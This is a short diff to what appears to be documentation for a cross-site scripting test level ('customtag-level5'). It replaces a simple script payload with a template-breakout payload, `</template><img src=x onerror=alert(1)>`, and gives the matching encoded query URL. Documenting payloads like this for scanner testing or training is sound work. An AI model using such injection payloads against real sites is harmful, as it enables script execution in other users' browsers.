@@ -32,10 +32,10 @@ Reflections inside custom elements, is= built-ins, slots, templates, output.
 
 ### customtag-level5
 
-`/customtag/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`
+`/customtag/level5/?query=%3C/template%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<script>alert(1)</script>`
-- context: inside `<template>` — inert in DOM but still scanned/copied if cloned
+- payload: `</template><img src=x onerror=alert(1)>`
+- context: inside `<template>` (inert) — close the template, then inject
 
 ### customtag-level6
 
